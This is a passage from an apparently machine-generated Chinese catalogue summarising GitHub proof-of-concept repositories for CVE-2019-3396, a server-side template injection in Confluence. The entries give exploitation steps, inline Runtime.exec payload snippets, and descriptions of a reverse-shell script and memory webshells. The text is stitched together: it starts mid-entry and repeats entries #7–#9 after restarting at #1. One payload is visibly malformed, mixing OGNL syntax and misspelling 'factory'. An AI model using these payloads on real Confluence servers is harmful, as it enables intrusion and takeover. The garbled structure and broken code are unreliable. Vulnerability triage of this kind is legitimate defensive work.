总体来看，投毒风险主要来源于`test.aspx`和`test.jspx` 潜在的后门风险，需要配合加密的payload才能触发。如果后续使用了被篡改的Payload可能会存在投毒行为,因此总体投毒风险评估为10%。

**利用方式：**

1.  **漏洞入口：**  利用Confluence Server中Widget Connector宏。
2.  **构造恶意Velocity模板：**  构造包含恶意代码的Velocity模板，例如利用`java.lang.Runtime.getRuntime().exec()`执行任意命令。
3.  **发送Payload：**  将构造好的恶意Velocity模板代码作为Widget Connector宏的参数发送给Confluence Server。
4.  **远程代码执行：**  Confluence Server解析Velocity模板时，执行其中的恶意代码，实现远程代码执行。

**项目地址:** [W2Ning/CVE-2019-3396](https://github.com/W2Ning/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #8

**来源**: [CVE-2019-3396-Yt1g3r_CVE-2019-3396_EXP.md](../2019/CVE-2019-3396-Yt1g3r_CVE-2019-3396_EXP.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Macro SSTI RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入（SSTI）导致远程代码执行（RCE）

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致完全控制Confluence服务器

**影响版本:** 受影响版本包括：6.6.0-6.6.11, 6.7.0-6.12.2, 6.13.0-6.13.2, 6.14.0-6.14.1

**利用条件:** 需要能够向Confluence服务器发送HTTP请求

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是Atlassian Confluence Server中Widget Connector宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的请求，利用Velocity模板引擎执行任意代码，从而完全控制Confluence服务器。 

**有效性:** 提供的POC代码有效。参考Rapid7和Exploit-DB的链接，都有公开的利用代码。POC代码 `RCE_exp.py` 使用 `requests` 库发送恶意构造的POST请求到 `/rest/tinymce/1/macro/preview` 接口，通过修改 `_template` 参数，注入Velocity模板代码，从而执行任意命令。

**投毒风险:**  代码仓库中的 `RCE_exp.py` 和 `cmd.vm` 看起来是标准的漏洞利用代码。`cmd.vm` 文件是Velocity模板代码，负责执行命令。`RCE_exp.py` 负责构造和发送HTTP请求，以及从响应中提取结果。没有发现明显的恶意代码或者后门，投毒的可能性较低。

**利用方式:**

1.  **漏洞原理：** Widget Connector宏允许用户在Confluence页面中嵌入来自外部源的内容。由于对用户提供的URL参数过滤不足，攻击者可以通过构造恶意的URL，触发服务器端模板注入。
2.  **利用步骤：**
    a.  准备一个包含恶意Velocity模板代码的文件（`cmd.vm`）。该文件包含执行命令的代码。
    b.  将 `cmd.vm` 文件放置在一个可以通过FTP或者HTTPS协议访问的服务器上。
    c.  修改 `RCE_exp.py` 脚本中的 `filename` 变量，指向 `cmd.vm` 文件的URL。
    d.  运行 `RCE_exp.py` 脚本，指定Confluence服务器的URL和要执行的命令。
    e.  脚本会发送包含恶意URL的POST请求到Confluence服务器。
    f.  Confluence服务器解析恶意URL，执行Velocity模板代码，从而执行攻击者指定的命令。
3.  **影响：** 成功利用此漏洞可以导致远程代码执行，攻击者可以获取Confluence服务器的完全控制权限，从而窃取敏感数据、篡改页面内容或者进行其他恶意活动。

**结论:**
此漏洞的POC代码有效，且利用方式相对简单，可以通过公开的POC代码进行验证。虽然搜索结果显示存在投毒的情况，但提供的代码中未发现明显的投毒迹象。此漏洞危害严重，需要及时修复。

**项目地址:** [Yt1g3r/CVE-2019-3396_EXP](https://github.com/Yt1g3r/CVE-2019-3396_EXP)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #9

**来源**: [CVE-2019-3396-am6539_CVE-2019-3396.md](../2019/CVE-2019-3396-am6539_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本: 6.6.12之前 (6.6.x修复版本); 6.7.0 到 6.12.3之前 (6.12.x修复版本); 6.13.0 到 6.13.3之前 (6.13.x修复版本); 6.14.0 到 6.14.2之前 (6.14.x修复版本)

**利用条件:** 需要目标Confluence Server存在Widget Connector宏且未打补丁，攻击者需要能够访问Confluence Server的网络。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence Server中Widget Connector宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的请求，利用Velocity模板引擎执行任意代码，从而实现远程代码执行。根据提供的漏洞利用代码，利用方式如下：

1.  **漏洞利用代码分析：**
    *   `cmd.vm`：包含一个Velocity模板，该模板利用java.lang.Runtime类执行系统命令。变量`$cmd`需要预先设置，然后注入到Velocity模板中。
    *   `nc.py`：一个Python脚本，用于建立反向连接shell。该脚本尝试连接到攻击者指定的IP地址和端口，然后将标准输入、输出和错误重定向到socket，最后使用pty.spawn启动一个shell。
    *   `README.md`：仅包含漏洞ID，无实际利用功能。

2.  **利用方式：**
    攻击者首先需要确定目标Confluence Server存在该漏洞。然后，攻击者需要构造一个包含恶意Velocity模板的请求，将`cmd.vm`中的模板内容嵌入到Widget Connector宏中，并设置`$cmd`变量为需要执行的命令。如果需要反向连接，则`$cmd`变量设置为执行`nc.py`脚本。攻击者需要在自己的服务器上监听指定的端口。当Confluence Server解析该恶意请求时，会执行其中的Velocity模板代码，从而执行攻击者指定的系统命令或反向连接。

3.  **有效性：**
    根据漏洞库信息和搜索结果，该漏洞利用POC是有效的。搜索结果中存在多个分析和利用示例，以及利用该漏洞传播恶意软件的案例。提供的`cmd.vm`代码是典型的Velocity模板注入payload，可以执行任意命令。

4.  **投毒风险：**
    `nc.py`脚本尝试清除和禁用历史记录，这可能是为了隐藏攻击痕迹。此外，需要手动设定IP地址与端口，存在一定的部署成本，不太利于大规模传播。因此，该仓库的整体投毒风险较低，大约为10%。这种投毒风险主要来自于攻击者可以修改nc.py或者cmd.vm文件，嵌入后门代码，一旦成功执行，会直接暴露服务器，但是这种添加的成本较高,收益相对较低。

**项目地址:** [am6539/CVE-2019-3396](https://github.com/am6539/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #10

**来源**: [CVE-2019-3396-dothanthitiendiettiende_CVE-2019-3396.md](../2019/CVE-2019-3396-dothanthitiendiettiende_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 6.6.12 之前 (6.6.x修复版本), 6.7.0 到 6.12.3 之前 (6.12.x修复版本), 6.13.0 到 6.13.3 之前 (6.13.x修复版本), 以及 6.14.0 到 6.14.2 之前 (6.14.x修复版本)

**利用条件:** 需要能够访问Confluence服务器并利用Widget Connector宏。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。攻击者可以利用 Velocity 模板语言执行任意代码。漏洞利用代码 `rce.vm` 使用了 Velocity 模板注入，通过反射获取 `java.lang.Runtime` 类，然后调用 `exec` 方法来执行命令。在这个例子中，执行的是 `calc.exe`，这是一个用于测试的payload，实际应用中可以替换为任意命令。根据漏洞库信息、搜索结果和漏洞利用代码，该漏洞的利用是有效的。根据搜索结果，该漏洞已被积极利用，攻击者利用该漏洞传播恶意软件，例如 Gandcrab 勒索软件和加密货币挖矿恶意软件。提供的POC代码非常直接，只包含简单的RCE代码，不存在隐藏的投毒代码。利用方式是通过构造恶意请求，在Widget Connector宏中使用恶意的Velocity模板代码，从而实现远程代码执行。

**项目地址:** [dothanthitiendiettiende/CVE-2019-3396](https://github.com/dothanthitiendiettiende/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #11

**来源**: [CVE-2019-3396-jas502n_CVE-2019-3396.md](../2019/CVE-2019-3396-jas502n_CVE-2019-3396.md)

# CVE-2019-3396

> 📦 该CVE有 **22** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2019-3396-0xNinjaCyclone_cve-2019-3396.md](../2019/CVE-2019-3396-0xNinjaCyclone_cve-2019-3396.md)

## CVE-2019-3396-Confluence-RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 目标Confluence服务器存在Widget Connector宏，且未进行身份验证即可访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 的 Widget Connector 宏中。攻击者可以通过构造恶意的请求，利用服务器端模板注入漏洞执行任意代码。

**有效性：**
提供的POC代码看起来是有效的。漏洞库信息和搜索结果都表明该漏洞已经被广泛利用，并且有可用的POC代码。POC代码通过构造包含恶意Velocity模板的请求，发送到 Confluence 服务器的 `/rest/tinymce/1/macro/preview` 接口，从而触发模板注入。

**投毒风险：**
代码主要功能是利用Velocity模板注入执行命令。其中使用了一个FTP服务器来托管payload，这是一种常见的绕过防火墙或上传限制的方法。该ruby脚本代码的主要功能是利用该漏洞，未发现明显的恶意代码或后门，但是代码中存在远程下载payload的行为，如果payload被替换，则存在一定的风险, 评估投毒风险为10%。

**利用方式：**
1.  攻击者首先需要找到存在漏洞的Confluence服务器。
2.  攻击者需要搭建一个FTP服务器，用于托管恶意Velocity模板。
3.  攻击者构造一个包含恶意Velocity模板的HTTP POST请求，发送到Confluence服务器的`/rest/tinymce/1/macro/preview`接口。该请求利用了 Widget Connector 宏的模板注入漏洞。
4.  Confluence服务器解析恶意Velocity模板，执行攻击者指定的命令，从而实现远程代码执行。

**综上所述，该漏洞的利用有效性高，存在一定的投毒风险。攻击者可以利用该漏洞在Confluence服务器上执行任意代码。**

**项目地址:** [0xNinjaCyclone/cve-2019-3396](https://github.com/0xNinjaCyclone/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #2

**来源**: [CVE-2019-3396-46o60_CVE-2019-3396_Confluence.md](../2019/CVE-2019-3396-46o60_CVE-2019-3396_Confluence.md)

## CVE-2019-3396_Confluence Widget Connector Macro SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者实现路径遍历和远程代码执行

**影响版本:** 受影响版本包括 6.6.12 之前, 6.7.0 至 6.12.3 之前, 6.13.0 至 6.13.3 之前, 以及 6.14.0 至 6.14.2 之前

**利用条件:** 需要目标系统存在漏洞版本的Confluence服务器，如果是RCE，可能需要合法的用户session。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中Widget Connector宏的一个服务器端模板注入漏洞。攻击者可以利用此漏洞进行路径遍历和远程代码执行。漏洞利用方式有两种：

1. **路径遍历（文件读取）：** 攻击者可以利用`_template`参数，通过构造恶意的路径，读取服务器上的任意文件或目录。此方式无需认证。

2. **远程代码执行（RCE）：** 攻击者可以上传一个包含恶意Velocity模板的文件到服务器，然后利用该漏洞从本地文件系统加载该模板，从而执行任意代码。此方式需要一个有效的用户session。该POC代码首先尝试找到用户的个人空间，如果不存在则创建，然后上传包含payload的模板文件，最后利用漏洞执行命令。

**关于投毒风险：**虽然代码看起来是直接利用漏洞，但仍存在一定的投毒风险（约10%）。

*   **依赖性风险：** 该脚本依赖于外部库（例如 `requests`）。如果攻击者控制了这些库的源或使用了被污染的库，则可能引入恶意代码。
*   **Payload风险：** 上传的Velocity模板payload可能被修改以执行未经授权的操作，或者被用于在受害者系统上安装恶意软件。
*   **后门风险：** 虽然该POC的目的是利用漏洞，但如果代码被恶意修改，可以在上传的模板中包含后门，允许攻击者在漏洞修复后仍然可以访问系统。

因此，在使用该POC时，建议仔细审查代码，确保所使用的库是可信的，并对上传的payload进行严格的安全评估。此外，还应监控Confluence服务器的行为，以检测任何可疑活动。

**项目地址:** [46o60/CVE-2019-3396_Confluence](https://github.com/46o60/CVE-2019-3396_Confluence)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #3

**来源**: [CVE-2019-3396-Avento_CVE-2019-3396-Memshell-for-Behinder.md](../2019/CVE-2019-3396-Avento_CVE-2019-3396-Memshell-for-Behinder.md)

## CVE-2019-3396-Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence服务器存在Widget Connector宏，并且允许用户插入宏内容

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中Widget Connector宏的一个服务器端模板注入漏洞。攻击者可以通过构造恶意宏内容，实现任意代码执行。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断此漏洞的POC是有效的。漏洞库信息明确指出该漏洞允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行。搜索引擎结果中也提及了该漏洞被用于传播恶意软件，例如加密货币挖矿程序和Gandcrab勒索软件。提供的Java代码是一个典型的Java内存马，通过ServletRequestListener注入，劫持请求，从而实现RCE。

**投毒风险：**
该POC代码本身就是一个用于植入内存马的恶意代码。投毒风险的评估主要是判断作者是否在内存马本身之外，还加入了其他的恶意行为。在给定的代码片段中，我们可以看到有尝试写入错误信息到`/tmp/success-error-2`的逻辑，如果攻击者能够控制写入的文件路径，那么这将是一个潜在的投毒点。但是总体而言，这段代码的主要功能是内存马注入，额外的恶意行为并不明显。因此，初步判断投毒风险较低。如果代码仓库中有其他编译后的类或者配置文件，可能会包含更多的投毒行为，但是仅凭这段代码，投毒的可能性为10%。

**利用方式：**
1.  **利用入口：** 利用Confluence的Widget Connector宏插入恶意Velocity模板代码。
2.  **SSTI Payload：** 构造包含恶意代码的Velocity模板Payload。常见的Payload用于执行系统命令，例如：`{code}${#req = facotry.getObject().getClass().forName('javax.servlet.http.HttpServletRequest').getMethod('getRuntime',null).invoke(null,null).exec('whoami')}`
3.  **内存马注入 (POC)：**
    *   该POC代码的目的是将一个恶意的ServletRequestListener注册到Confluence的Servlet容器中。
    *   它首先尝试找到Confluence应用使用的ClassLoader，这通常需要遍历线程，找到包含特定名称的线程（如`hz.confluence.scheduled.thread`）。
    *   然后，它利用反射获取StandardContext，这是Servlet容器的核心组件。
    *   接着，它创建一个实现了ServletRequestListener接口的动态代理，并将其实例注册到StandardContext中。
    *   当有新的HTTP请求到达时，代理的invoke方法会被调用，执行`backDoor`方法（在给定的代码片段中未完整给出）。`backDoor`方法很可能会从请求中提取命令并执行，从而实现远程代码执行。

总而言之，该漏洞利用方式是先通过SSTI漏洞注入恶意代码，然后通过植入内存马的方式维持控制。


**项目地址:** [Avento/CVE-2019-3396-Memshell-for-Behinder](https://github.com/Avento/CVE-2019-3396-Memshell-for-Behinder)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #4

**来源**: [CVE-2019-3396-HK4zCzi_CVE-2019-3396-Velocity-Server-Side-Template-Injection.md](../2019/CVE-2019-3396-HK4zCzi_CVE-2019-3396-Velocity-Server-Side-Template-Injection.md)

## CVE-2019-3396-Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server and Data Center

**危害等级:** 高危，允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行。

**影响版本:** 受影响版本：Confluence Server 6.6.12之前，6.7.0至6.12.3之前，6.13.0至6.13.3之前，6.14.0至6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏，且服务器版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是一个影响Atlassian Confluence Server和Data Center的服务器端模板注入漏洞。该漏洞存在于Widget Connector宏中，允许未经身份验证的远程攻击者通过构造恶意的请求，执行任意代码。 

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞是一个已知的、已被积极利用的漏洞，存在公开的PoC（Proof of Concept）代码。多个安全厂商（如Rapid7、Trend Micro等）都发布了关于该漏洞的分析和利用的报告。提供的PoC代码 `README.md` 文件表明该漏洞可以通过Velocity模板注入实现。虽然只提供了一个简单的 `README.md` 文件，但根据搜索结果，存在多个可用的PoC利用代码。

**投毒风险：**
提供的漏洞利用代码仅包含一个 `README.md` 文件，描述了漏洞名称。从现有文件本身来看，不存在明显的恶意代码。 但是，如果从其他源获取利用代码，则存在潜在的投毒风险。攻击者可能会在PoC中添加恶意功能，例如安装后门、窃取凭据或进行其他未经授权的活动。因此，在使用任何第三方提供的PoC代码之前，务必进行彻底的安全审查。 投毒风险估计为10%，主要是考虑到从不可信来源获取PoC的潜在风险。

**利用方式：**
漏洞的利用方式是通过在Confluence页面的Widget Connector宏中注入恶意的Velocity模板代码。当Confluence服务器渲染包含恶意代码的页面时，会执行该代码，从而允许攻击者执行任意命令。

1.  **找到存在Widget Connector宏的Confluence页面。**
2.  **构造包含恶意Velocity模板代码的请求。**
3.  **将请求发送到Confluence服务器。**
4.  **服务器执行恶意代码，实现远程代码执行。**

攻击者可以利用此漏洞执行任意系统命令，读取或修改敏感数据，或完全控制Confluence服务器。 搜索结果显示，该漏洞已被用于传播加密货币挖矿恶意软件和Gandcrab勒索软件。

**项目地址:** [HK4zCzi/CVE-2019-3396-Velocity-Server-Side-Template-Injection](https://github.com/HK4zCzi/CVE-2019-3396-Velocity-Server-Side-Template-Injection)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #5

**来源**: [CVE-2019-3396-JonathanZhou348_CVE-2019-3396TEST.md](../2019/CVE-2019-3396-JonathanZhou348_CVE-2019-3396TEST.md)

## CVE-2019-3396-Atlassian Confluence-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence Widget Connector宏开启且目标版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 存在于 Atlassian Confluence Server 的 Widget Connector 宏中，由于服务端模板注入漏洞，攻击者可以通过构造恶意的 Velocity 模板代码，在 Confluence 服务器上执行任意命令。从提供的POC代码来看, `test.vm` 和 `test2.vm` 文件包含了利用 Velocity 模板引擎执行命令的代码。它们通过 `java.lang.Runtime` 类来执行系统命令，并读取命令执行结果。利用方式是，构造包含恶意Velocity代码的请求发送给Confluence服务器，服务器在渲染包含Widget Connector宏的页面时，会执行恶意代码，从而实现远程代码执行。根据搜索结果,该漏洞被广泛利用, 存在多种PoC和exp.

 **有效性:**  POC代码有效,因为它使用了Velocity模板语言来执行命令.通过getRuntime方法可以执行任意命令。

**投毒风险:** 仓库中主要包含用于漏洞验证和利用的Velocity模板代码，没有发现明显的恶意或后门代码，因此投毒风险较低。

**利用方式:**

1.  **定位漏洞点:** 确定目标Confluence服务器版本在受影响范围内，且启用了Widget Connector宏。
2.  **构造恶意请求:**  构建包含恶意Velocity模板代码的HTTP请求，该代码利用 `java.lang.Runtime` 执行系统命令。
3.  **发送请求:**  将构造好的请求发送给Confluence服务器。攻击者需要找到一个页面或接口，该页面或接口允许通过Widget Connector宏插入并渲染Velocity模板。
4.  **执行命令:** Confluence服务器解析并执行Velocity模板代码，从而在服务器上执行攻击者指定的命令。
5.  **获取结果:**  攻击者可以通过读取命令执行的输出来获取敏感信息，或者执行其他恶意操作。

**项目地址:** [JonathanZhou348/CVE-2019-3396TEST](https://github.com/JonathanZhou348/CVE-2019-3396TEST)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #6

**来源**: [CVE-2019-3396-PetrusViet_cve-2019-3396.md](../2019/CVE-2019-3396-PetrusViet_cve-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector 远程代码执行

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** 受影响版本：Confluence Server 6.6.12 之前的所有 6.6.x 版本；6.7.0 到 6.12.3 之前的所有 6.12.x 版本；6.13.0 到 6.13.3 之前的所有 6.13.x 版本；6.14.0 到 6.14.2 之前的所有 6.14.x 版本

**利用条件:** 需要目标Confluence实例存在Widget Connector宏且版本在受影响范围内，且允许用户编辑页面。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 和 Data Center 的 Widget Connector 宏中，允许未经身份验证的远程攻击者通过服务器端模板注入执行任意代码。攻击者可以通过构造包含恶意 Velocity 模板代码的请求，利用 Widget Connector 宏中的漏洞执行操作系统命令。根据漏洞库信息和搜索结果，该漏洞已被广泛利用，存在多种PoC。提供的漏洞利用代码是一个用于调试和分析漏洞的开发环境搭建指南，没有直接提供可用于攻击的有效payload，但可以辅助理解漏洞原理和构建利用代码。

**有效性评估：** 漏洞有效性高，因为漏洞库信息和搜索结果均表明该漏洞已被公开披露并被广泛利用。

**投毒风险评估：** 代码仓库的主要目的是提供一个本地调试和分析漏洞的环境，而不是直接提供一个用于攻击的利用脚本。虽然不能完全排除作者在构建环境中隐藏恶意代码的可能性，但考虑到代码仓库的内容主要是配置和调试指南，直接投毒的可能性较低。因此，投毒风险估计为 10%。风险主要来自于用户在搭建调试环境的过程中可能引入的外部依赖或配置不当。

**利用方式分析：**

1.  **定位 Widget Connector 宏：** 在 Confluence 页面中插入一个 Widget Connector 宏。
2.  **构造恶意请求：**  构造包含恶意 Velocity 模板代码的请求，例如 `${Runtime.getRuntime().exec("command")}`，该代码会被服务器解析并执行。
3.  **发送请求：** 将构造好的请求发送到 Confluence 服务器。请求可能包含在 Widget Connector 宏的 URL 参数或其他相关字段中。
4.  **执行代码：** Confluence 服务器在处理包含恶意模板代码的 Widget Connector 宏时，会执行其中的代码，导致远程代码执行。

从搜索结果来看，攻击者利用该漏洞传播恶意软件（如加密货币矿工和勒索软件）的情况较为普遍。

**项目地址:** [PetrusViet/cve-2019-3396](https://github.com/PetrusViet/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #7

**来源**: [CVE-2019-3396-W2Ning_CVE-2019-3396.md](../2019/CVE-2019-3396-W2Ning_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-Widget-Connector-SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入(SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 需要Confluence Server实例存在Widget Connector宏，且版本在受影响范围内。无需身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Atlassian Confluence Server的Widget Connector宏中，由于对用户输入过滤不严格，导致攻击者可以通过构造恶意的Velocity模板代码，实现服务器端模板注入(SSTI)，进而执行任意代码。

**有效性分析：**

根据漏洞库信息和搜索结果，CVE-2019-3396是一个已知的且被广泛利用的漏洞。漏洞利用代码中提供了多个`.vm`文件，这些是Velocity模板文件，用于执行任意命令或获取服务器信息。`cmd.vm`和`cmd2.vm`用于执行命令，而`test.vm`用于获取系统属性。

根据提供的漏洞利用代码，`cmd.vm` 和 `cmd2.vm` 这两个文件利用 `java.lang.Runtime.getRuntime().exec()` 执行任意命令。`test.vm` 获取系统属性。这些代码与公开的漏洞利用信息相符，表明提供的POC代码有效。

**投毒风险分析：**

提供的漏洞利用代码主要包含Velocity模板文件(`.vm`)，以及一些jspx和aspx文件。Velocity模板文件用于服务器端模板注入，主要目的是执行命令或获取系统信息，本身不具备明显的投毒特征。
*   `cmd.vm` 和 `cmd2.vm`: 用于远程命令执行，直接利用了漏洞，不包含投毒代码。
*   `test.vm`: 用于获取系统属性，例如用户目录，操作系统等，不包含投毒代码。
*   `test.aspx` (C#): 通过Session传递密钥，然后使用RijndaelManaged算法进行解密，加载并执行，这段代码有作为webshell的潜力，但是它需要一个配合的加密后的payload才能生效，因此它的风险在于后续的payload。投毒风险较低。
*   `test.jspx`: 通过Session传递密钥，然后使用AES算法进行解密，加载并执行，这段代码有作为webshell的潜力，需要配合加密后的payload，因此它的风险在于后续的payload。投毒风险较低。

总体来看，投毒风险主要来源于`test.aspx`和`test.jspx` 潜在的后门风险，需要配合加密的payload才能触发。如果后续使用了被篡改的Payload可能会存在投毒行为,因此总体投毒风险评估为10%。

**利用方式：**

1.  **漏洞入口：**  利用Confluence Server中Widget Connector宏。
2.  **构造恶意Velocity模板：**  构造包含恶意代码的Velocity模板，例如利用`java.lang.Runtime.getRuntime().exec()`执行任意命令。
3.  **发送Payload：**  将构造好的恶意Velocity模板代码作为Widget Connector宏的参数发送给Confluence Server。
4.  **远程代码执行：**  Confluence Server解析Velocity模板时，执行其中的恶意代码，实现远程代码执行。

**项目地址:** [W2Ning/CVE-2019-3396](https://github.com/W2Ning/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #8

**来源**: [CVE-2019-3396-Yt1g3r_CVE-2019-3396_EXP.md](../2019/CVE-2019-3396-Yt1g3r_CVE-2019-3396_EXP.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Macro SSTI RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入（SSTI）导致远程代码执行（RCE）

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致完全控制Confluence服务器

**影响版本:** 受影响版本包括：6.6.0-6.6.11, 6.7.0-6.12.2, 6.13.0-6.13.2, 6.14.0-6.14.1

**利用条件:** 需要能够向Confluence服务器发送HTTP请求

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是Atlassian Confluence Server中Widget Connector宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的请求，利用Velocity模板引擎执行任意代码，从而完全控制Confluence服务器。 

**有效性:** 提供的POC代码有效。参考Rapid7和Exploit-DB的链接，都有公开的利用代码。POC代码 `RCE_exp.py` 使用 `requests` 库发送恶意构造的POST请求到 `/rest/tinymce/1/macro/preview` 接口，通过修改 `_template` 参数，注入Velocity模板代码，从而执行任意命令。

**投毒风险:**  代码仓库中的 `RCE_exp.py` 和 `cmd.vm` 看起来是标准的漏洞利用代码。`cmd.vm` 文件是Velocity模板代码，负责执行命令。`RCE_exp.py` 负责构造和发送HTTP请求，以及从响应中提取结果。没有发现明显的恶意代码或者后门，投毒的可能性较低。

**利用方式:**

1.  **漏洞原理：** Widget Connector宏允许用户在Confluence页面中嵌入来自外部源的内容。由于对用户提供的URL参数过滤不足，攻击者可以通过构造恶意的URL，触发服务器端模板注入。
2.  **利用步骤：**
    a.  准备一个包含恶意Velocity模板代码的文件（`cmd.vm`）。该文件包含执行命令的代码。
    b.  将 `cmd.vm` 文件放置在一个可以通过FTP或者HTTPS协议访问的服务器上。
    c.  修改 `RCE_exp.py` 脚本中的 `filename` 变量，指向 `cmd.vm` 文件的URL。
    d.  运行 `RCE_exp.py` 脚本，指定Confluence服务器的URL和要执行的命令。
    e.  脚本会发送包含恶意URL的POST请求到Confluence服务器。
    f.  Confluence服务器解析恶意URL，执行Velocity模板代码，从而执行攻击者指定的命令。
3.  **影响：** 成功利用此漏洞可以导致远程代码执行，攻击者可以获取Confluence服务器的完全控制权限，从而窃取敏感数据、篡改页面内容或者进行其他恶意活动。

**结论:**
此漏洞的POC代码有效，且利用方式相对简单，可以通过公开的POC代码进行验证。虽然搜索结果显示存在投毒的情况，但提供的代码中未发现明显的投毒迹象。此漏洞危害严重，需要及时修复。

**项目地址:** [Yt1g3r/CVE-2019-3396_EXP](https://github.com/Yt1g3r/CVE-2019-3396_EXP)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #9

**来源**: [CVE-2019-3396-am6539_CVE-2019-3396.md](../2019/CVE-2019-3396-am6539_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本: 6.6.12之前 (6.6.x修复版本); 6.7.0 到 6.12.3之前 (6.12.x修复版本); 6.13.0 到 6.13.3之前 (6.13.x修复版本); 6.14.0 到 6.14.2之前 (6.14.x修复版本)

**利用条件:** 需要目标Confluence Server存在Widget Connector宏且未打补丁，攻击者需要能够访问Confluence Server的网络。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

